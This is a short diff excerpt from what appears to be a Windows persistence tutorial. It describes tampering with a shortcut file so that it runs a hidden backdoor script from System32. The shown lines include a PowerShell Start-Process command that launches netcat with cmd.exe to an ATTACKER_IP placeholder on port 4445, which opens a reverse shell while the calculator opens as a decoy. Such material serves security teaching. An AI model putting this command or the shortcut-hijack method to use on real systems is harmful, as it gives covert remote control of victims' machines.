@@ -14,6 +14,7 @@ We can tamper with the shortcut file to run a script that will run a backdoor an
 
 1. Backdoor script in `C:\Windows\System32` or any other sneaky location :
 File name: `sc.ps1` (it says, Reverse a shell and then run the calculator)
+
 ```
 Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe <put your ATTACKER_IP> 4445"
 
